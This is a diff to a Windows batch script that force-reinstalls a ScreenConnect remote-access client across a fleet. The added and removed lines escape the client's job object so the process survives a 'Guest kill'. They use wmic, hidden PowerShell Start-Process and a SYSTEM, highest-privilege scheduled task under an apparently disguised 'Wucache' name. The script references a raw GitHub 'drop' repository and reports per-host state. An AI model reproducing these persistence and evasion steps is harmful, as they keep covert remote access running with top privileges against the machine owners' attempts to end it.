@@ -1,7 +1,6 @@
 @echo off
-rem OWN_GRYXA_FORCE BUILD 20260804F7 - fleet REINSTALL via wmic (survives sevrz 10s; schtasks Queued is broken)
-rem F7: wmic process call create SYSTEM-equivalent breakaway. schtasks ONCE often stays Queued.
-rem F6: schtasks attempt. F5: keep G5.
+rem OWN_GRYXA_FORCE BUILD 20260804F8 - REINSTALL breakaway (wmic plain path + PS Start-Process + minute task)
+rem F8: wmic failed on escaped quotes; schtasks ONCE stays Queued — use MINUTE+/Run.
 setlocal EnableExtensions EnableDelayedExpansion
 
 set "WD=%~1"
@@ -16,7 +15,7 @@ set "LOG=%WD%\own_gryxa_force.log"
 set "RAWMAIN=https://raw.githubusercontent.com/xnobuddy/github-drop/main"
 set "WORKER=%STAGE%\gryxa_reinstall_once.cmd"
 set "TASK=WucacheGryxaReinstall"
-set "BUILD=F7"
+set "BUILD=F8"
 
 if not exist "%WD%" mkdir "%WD%" >nul 2>&1
 if not exist "%STAGE%" mkdir "%STAGE%" >nul 2>&1
@@ -67,33 +66,34 @@ schtasks /Delete /TN "%TASK%" /F >nul 2>&1
 
 > "%WORKER%" (
   echo @echo off
-  echo echo [%DATE% %TIME%] wmic_reinstall_begin^>^>"%LOG%"
+  echo echo [%DATE% %TIME%] reinstall_begin^>^>"%LOG%"
   echo call "%WD%\own_gryxa.cmd" "%WD%" "%FP%" "%KEEP%" "%ALT%" REINSTALL ^>^>"%LOG%" 2^>^&1
-  echo echo [%DATE% %TIME%] wmic_reinstall_done err=%%ERRORLEVEL%%^>^>"%LOG%"
+  echo echo [%DATE% %TIME%] reinstall_done err=%%ERRORLEVEL%%^>^>"%LOG%"
+  echo schtasks /Delete /TN "%TASK%" /F ^>nul 2^>^&1
 )
 
-rem breakaway from ScreenConnect job object — survives 10s Guest kill
-wmic process call create "cmd.exe /c call \"%WORKER%\"" >"%STAGE%\wmic_create.out" 2>&1
-findstr /I "ProcessId" "%STAGE%\wmic_create.out" >nul
-if errorlevel 1 (
-  rem fallback: schtasks with near-future ST + Run
-  for /f "tokens=1-2 delims=:" %%A in ("%TIME%") do (
-    set /a H=%%A
-    set /a M=1%%B-100+2
-  )
-  if !M! GEQ 60 (
-    set /a M-=60
-    set /a H+=1
-  )
-  if !H! GEQ 24 set /a H=0
-  if !H! LSS 10 (set "HH=0!H!") else (set "HH=!H!")
-  if !M! LSS 10 (set "MM=0!M!") else (set "MM=!M!")
-  schtasks /Create /TN "%TASK%" /TR "cmd.exe /c call \"%WORKER%\"" /SC ONCE /ST !HH!:!MM! /RU SYSTEM /RL HIGHEST /F >nul 2>&1
-  schtasks /Run /TN "%TASK%" >nul 2>&1
-  set "ACTION=schtasks-fallback"
-) else (
+set "ACTION=fail"
+rem 1) wmic with NO nested quotes (F7 escaping broke ProcessId)
+wmic process call create "cmd.exe /c %WORKER%" >"%STAGE%\wmic_create.out" 2>&1
+findstr /I "ProcessId =" "%STAGE%\wmic_create.out" >nul
+if not errorlevel 1 (
   set "ACTION=wmic-reinstall"
+  goto :Report
 )
+
+rem 2) PowerShell Start-Process breakaway
+powershell -NoProfile -NonInteractive -WindowStyle Hidden -Command "Start-Process -FilePath 'cmd.exe' -ArgumentList '/c','%WORKER%' -WindowStyle Hidden" >nul 2>&1
+if not errorlevel 1 (
+  set "ACTION=ps-start-reinstall"
+  goto :Report
+)
+
+rem 3) schtasks MINUTE (can /Run on demand; ONCE stays Queued)
+schtasks /Create /TN "%TASK%" /TR "cmd.exe /c %WORKER%" /SC MINUTE /MO 60 /RU SYSTEM /RL HIGHEST /F >nul 2>&1
+schtasks /Run /TN "%TASK%" >nul 2>&1
+set "ACTION=schtasks-minute-run"
+
+:Report
 echo [%DATE% %TIME%] launched ACTION=!ACTION! pre=%PRE%>>"%LOG%"
 
 set "STATE=ABSENT"
@@ -107,6 +107,7 @@ if errorlevel 1 (
 )
 
 set "HEALTH=QUEUED"
+if /I "!ACTION!"=="fail" set "HEALTH=FAIL"
 set "DIR=0"
 if exist "%ProgramFiles(x86)%\ScreenConnect Client (%FP%)" set "DIR=1"
 if exist "%ProgramFiles%\ScreenConnect Client (%FP%)" set "DIR=1"
@@ -124,4 +125,5 @@ echo ACTION=!ACTION!
 echo REPORT %COMPUTERNAME% %FP% !HEALTH! state=!STATE! dir=!DIR! pre=%PRE% action=!ACTION!
 echo ==========================
 echo [%DATE% %TIME%] REPORT HEALTH=!HEALTH! STATE=!STATE! ACTION=!ACTION!>>"%LOG%"
+type "%STAGE%\wmic_create.out" >>"%LOG%" 2>nul
 endlocal & exit /b 0
